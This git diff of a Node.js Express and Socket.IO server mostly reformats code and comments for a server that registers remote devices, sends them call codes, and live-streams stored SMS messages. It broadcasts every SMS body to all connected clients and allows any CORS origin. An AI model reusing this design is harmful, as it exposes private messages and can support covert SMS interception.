@@ -46,11 +46,11 @@ const PORT = process.env.PORT || 5000;
 const app = express();
 const server = createServer(app);
 
-// ---------- CORS (FIXED) ----------
-// Sab origin allow + preflight (OPTIONS) bhi handle
+// ---------- CORS (GLOBAL) ----------
+// Netlify (frontend) + Render (backend) ke liye sab origin allowed
 app.use(
   cors({
-    origin: "*", // chahe 127.0.0.1:5501 ho ya Render ka domain, sab allowed
+    origin: "*",
     methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
     allowedHeaders: [
       "Content-Type",
@@ -62,17 +62,19 @@ app.use(
   })
 );
 
-// Preflight requests (OPTIONS) ko yahin handle karenge
+// Preflight requests (OPTIONS)
 app.options("*", cors());
 
 app.use(express.json());
 
-// Socket.IO with simple CORS
+// ---------- SOCKET.IO (Render friendly) ----------
 const io = new Server(server, {
   cors: {
     origin: "*",
     methods: ["GET", "POST"],
   },
+  // Render + Netlify dono par stable
+  transports: ["websocket", "polling"],
 });
 
 app.set("io", io);
@@ -94,7 +96,7 @@ function notifyWatchers(uniqueid, payload) {
   }
 }
 
-// OPTIONAL: helper exported for controllers (if you still import from server.js)
+// helper for controllers
 export function sendCallCodeToDevice(rawId, payload) {
   const id = cleanId(rawId);
   if (!id) return false;
@@ -133,16 +135,21 @@ io.on("connection", (socket) => {
     const id = cleanId(rawId);
     if (!id) return;
     console.log("🔗 Device Registered:", id);
+
     deviceSockets.set(id, socket.id);
     currentUniqueId = id;
+
     socket.join(id);
     saveLastSeen(id, "Online").catch(() => {});
+
     io.to(socket.id).emit("deviceRegistered", { uniqueid: id });
+
     const payload = {
       uniqueid: id,
       connectivity: "Online",
       updatedAt: new Date(),
     };
+
     io.emit("deviceStatus", payload);
     notifyWatchers(id, payload);
   });
@@ -151,7 +158,9 @@ io.on("connection", (socket) => {
     const id = cleanId(data.uniqueid);
     if (!id) return;
     const connectivity = data.connectivity || "Online";
+
     saveLastSeen(id, connectivity).catch(() => {});
+
     const payload = { uniqueid: id, connectivity, updatedAt: new Date() };
     io.emit("deviceStatus", payload);
     notifyWatchers(id, payload);
@@ -159,34 +168,40 @@ io.on("connection", (socket) => {
 
   socket.on("disconnect", () => {
     console.log("🔴 SOCKET DISCONNECTED:", socket.id);
+
     if (currentUniqueId) {
       const id = currentUniqueId;
       const last = deviceSockets.get(id);
+
       if (last === socket.id) {
         deviceSockets.delete(id);
+
         saveLastSeen(id, "Offline").catch(() => {});
+
         const payload = {
           uniqueid: id,
           connectivity: "Offline",
           updatedAt: new Date(),
         };
+
         io.emit("deviceStatus", payload);
         notifyWatchers(id, payload);
       }
     }
+
     for (let [id, set] of watchers.entries()) {
       set.delete(socket.id);
     }
   });
 });
 
-// ---------------- Helper: saveLastSeen uses deployed URL if available ----------------
+// ---------------- Helper: saveLastSeen ----------------
 async function saveLastSeen(uniqueid, connectivity) {
   try {
     const base =
       process.env.RENDER_EXTERNAL_URL ||
       process.env.EXTERNAL_URL ||
-      `http://localhost:${process.env.PORT || 5000}`;
+      `http://localhost:${PORT}`;
 
     const url = new URL(
       `/api/lastseen/${encodeURIComponent(uniqueid)}/status`,
@@ -216,9 +231,11 @@ mongoose.connection.once("open", async () => {
         stream.on("change", async (chg) => {
           if (!["insert", "update", "replace"].includes(chg.operationType))
             return;
+
           const doc = await mongoose.connection
             .collection(collection)
             .findOne({ _id: chg.documentKey._id });
+
           if (doc) cb(doc);
         });
 
@@ -231,11 +248,7 @@ mongoose.connection.once("open", async () => {
           setTimeout(start, 2000);
         });
       } catch (e) {
-        console.error(
-          "Watch start error for",
-          collection,
-          e.message || e
-        );
+        console.error("Watch start error for", collection, e.message || e);
         setTimeout(start, 2000);
       }
     };
@@ -265,12 +278,16 @@ mongoose.connection.once("open", async () => {
     const smsStream = Sms.watch();
     smsStream.on("change", async (chg) => {
       if (!["insert", "update", "replace"].includes(chg.operationType)) return;
+
       const docId = chg.documentKey?._id;
       if (!docId) return;
+
       const doc = await Sms.findById(docId).lean();
       if (!doc || !doc.uniqueid) return;
+
       const id = cleanId(doc.uniqueid);
       console.log("📩 SMS LIVE:", doc.body || doc);
+
       io.to(id).emit("smsUpdate", doc);
       notifyWatchers(id, { type: "sms", ...doc });
       io.emit("smsGlobal", doc);
@@ -331,6 +348,7 @@ server.listen(PORT, () => {
 process.on("unhandledRejection", (reason, p) => {
   console.error("Unhandled Rejection at: Promise", p, "reason:", reason);
 });
+
 process.on("uncaughtException", (err) => {
   console.error("Uncaught Exception thrown", err);
   // process.exit(1); // optional
